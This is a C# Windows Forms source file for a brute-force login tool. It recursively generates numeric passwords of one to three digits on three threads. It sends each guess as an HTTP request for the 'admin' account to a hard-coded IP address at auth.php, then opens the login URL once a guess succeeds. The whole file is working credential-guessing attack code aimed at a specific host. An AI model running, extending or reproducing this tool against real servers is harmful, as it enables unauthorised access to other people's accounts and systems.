using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;

namespace BruteForce
{
    public partial class BruteForce : Form
    {

        // the secret password which we will try to find via brute force
        private static string result;
        private static bool isMatched = false;

        /* The length of the charactersToTest Array is stored in a
         * additional variable to increase performance  */
        private static int charactersToTestLength = 0;
        private static long computedKeys = 0;

        /* An array containing the characters which will be used to create the brute force keys,
         * if less characters are used (e.g. only lower case chars) the faster the password is matched  */
        private static char[] charactersToTest =
        {
        '0', '1', '2', '3', '4', '5', '6' ,'7', '8', '9'
        };

        public BruteForce()
        {
            InitializeComponent();
        }

        private void BruteForceButton_Click(object sender, EventArgs e)
        {
            charactersToTestLength = charactersToTest.Length;
            Loading.Visible = true;
            new Thread(() =>
            {
                startBruteForce(3);
            }).Start();
            new Thread(() =>
            {
                startBruteForce(1);
            }).Start();
            new Thread(() =>
            {
                startBruteForce(2);
            }).Start();

            if (isMatched)
            {
                Loading.Visible = false;
                password.Text += result;
                password.Visible = true;
                MessageBox.Show("The password is: " + result);
                System.Diagnostics.Process.Start("http://212.143.244.206/auth.php?username=admin&password=" + result);

            }
        }

        private static void startBruteForce(int keyLength)
        {
            var keyChars = createCharArray(keyLength, charactersToTest[0]);
            // The index of the last character will be stored for slight perfomance improvement
            var indexOfLastChar = keyLength - 1;
            createNewKey(0, keyChars, keyLength, indexOfLastChar);
        }

        private static char[] createCharArray(int length, char defaultChar)
        {
            return (from c in new char[length] select defaultChar).ToArray();
        }

        private static void createNewKey(int currentCharPosition, char[] keyChars, int keyLength, int indexOfLastChar)
        {
            var nextCharPosition = currentCharPosition + 1;
            // We are looping trough the full length of our charactersToTest array
            for (int i = 0; i < charactersToTestLength; i++)
            {
                /* The character at the currentCharPosition will be replaced by a
                 * new character from the charactersToTest array => a new key combination will be created */
                keyChars[currentCharPosition] = charactersToTest[i];

                // The method calls itself recursively until all positions of the key char array have been replaced
                if (currentCharPosition < indexOfLastChar)
                {
                    createNewKey(nextCharPosition, keyChars, keyLength, indexOfLastChar);
                }
                else
                {
                    // A new key has been created, remove this counter to improve performance
                    computedKeys++;

                    /* The char array will be converted to a string and compared to the password. If the password
                     * is matched the loop breaks and the password is stored as result. */

                    WebClient client = new WebClient();
                    string theBody = null;
                    string downloadString = client.DownloadString("http://212.143.244.206/auth.php?username=admin&password=" + new String(keyChars));
                    RegexOptions options = RegexOptions.IgnoreCase | RegexOptions.Singleline;
                    Regex regx = new Regex("<body>(?<theBody>.*)</body>", options);
                    Match match = regx.Match(downloadString);
                    if (match.Success)
                    {
                        theBody = match.Groups["theBody"].Value;
                    }
                    if (theBody.Equals("\nsuccess"))
                    {
                        isMatched = true;
                        result = new String(keyChars);
                        break;
                    }
                }
            }
        }
    }
}
